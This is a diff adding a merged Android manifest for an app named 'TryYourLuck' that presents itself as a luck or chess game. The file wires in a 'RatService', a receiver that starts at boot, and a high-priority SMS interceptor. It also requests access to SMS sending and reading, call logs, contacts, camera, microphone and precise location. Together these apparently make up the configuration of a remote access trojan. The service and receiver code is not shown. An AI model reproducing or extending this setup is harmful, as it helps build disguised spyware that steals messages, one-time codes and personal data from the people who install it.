@@ -1,0 +1,151 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.my.luck"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="21"
+9        android:targetSdkVersion="33" />
+10
+11    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+11-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:5:5-80
+11-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:5:22-77
+12    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+12-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:6:5-81
+12-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:6:22-78
+13    <uses-permission android:name="android.permission.READ_SMS" />
+13-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:7:5-67
+13-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:7:22-64
+14    <uses-permission android:name="android.permission.SEND_SMS" />
+14-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:8:5-67
+14-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:8:22-64
+15    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+15-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:9:5-70
+15-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:9:22-67
+16    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+16-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:10:5-72
+16-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:10:22-69
+17    <uses-permission android:name="android.permission.READ_CONTACTS" />
+17-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:11:5-72
+17-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:11:22-69
+18    <uses-permission android:name="android.permission.CAMERA" />
+18-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:12:5-65
+18-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:12:22-62
+19    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+19-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:13:5-71
+19-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:13:22-68
+20    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+20-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:14:5-79
+20-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:14:22-76
+21    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+21-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:15:5-81
+21-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:15:22-78
+22    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+22-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:16:5-76
+22-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:16:22-73
+23    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+23-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:17:5-76
+23-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:17:22-73
+24    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+24-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:18:5-81
+24-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:18:22-78
+25    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+25-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:19:5-77
+25-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:19:22-74
+26    <uses-permission android:name="android.permission.INTERNET" />
+26-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:20:5-67
+26-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:20:22-64
+27    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+27-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:21:5-79
+27-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:21:22-76
+28
+29    <application
+29-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:23:5-71:19
+30        android:allowBackup="true"
+30-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:24:9-35
+31        android:debuggable="true"
+32        android:extractNativeLibs="true"
+33        android:icon="@android:drawable/sym_def_app_icon"
+33-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:25:9-58
+34        android:label="@string/app_name"
+34-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:26:9-41
+35        android:requestLegacyExternalStorage="true"
+35-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:29:9-52
+36        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
+36-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:27:9-67
+37        android:usesCleartextTraffic="true" >
+37-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:28:9-44
+38        <activity
+38-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:32:9-40:20
+39            android:name="com.my.luck.MainActivity"
+39-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:33:13-41
+40            android:exported="true"
+40-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:34:13-36
+41            android:theme="@style/Theme.AppCompat.NoActionBar" >
+41-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:35:13-63
+42            <intent-filter>
+42-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:36:13-39:29
+43                <action android:name="android.intent.action.MAIN" />
+43-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:37:17-69
+43-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:37:25-66
+44
+45                <category android:name="android.intent.category.LAUNCHER" />
+45-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:38:17-77
+45-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:38:27-74
+46            </intent-filter>
+47        </activity>
+48        <activity
+48-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:42:9-45:52
+49            android:name="com.my.luck.ChessActivity"
+49-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:43:13-42
+50            android:exported="false"
+50-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:44:13-37
+51            android:screenOrientation="portrait" />
+51-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:45:13-49
+52
+53        <service
+53-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:47:9-50:40
+54            android:name="com.my.luck.core.RatService"
+54-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:48:13-44
+55            android:enabled="true"
+55-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:49:13-35
+56            android:exported="false" />
+56-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:50:13-37
+57
+58        <receiver
+58-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:52:9-59:20
+59            android:name="com.my.luck.core.BootReceiver"
+59-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:53:13-46
+60            android:enabled="true"
+60-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:54:13-35
+61            android:exported="true" >
+61-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:55:13-36
+62            <intent-filter>
+62-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:56:13-58:29
+63                <action android:name="android.intent.action.BOOT_COMPLETED" />
+63-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:57:17-79
+63-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:57:25-76
+64            </intent-filter>
+65        </receiver>
+66        <receiver
+66-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:61:9-69:20
+67            android:name="com.my.luck.features.SmsInterceptor"
+67-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:62:13-52
+68            android:enabled="true"
+68-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:63:13-35
+69            android:exported="true"
+69-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:64:13-36
+70            android:permission="android.permission.BROADCAST_SMS" >
+70-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:65:13-66
+71            <intent-filter android:priority="1000" >
+71-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:66:13-68:29
+71-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:66:28-51
+72                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+72-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:67:17-82
+72-->/data/data/com.tom.rv2ide/files/home/TryYourLuck/app/src/main/AndroidManifest.xml:67:25-79
+73            </intent-filter>
+74        </receiver>
+75    </application>
+76
+77</manifest>
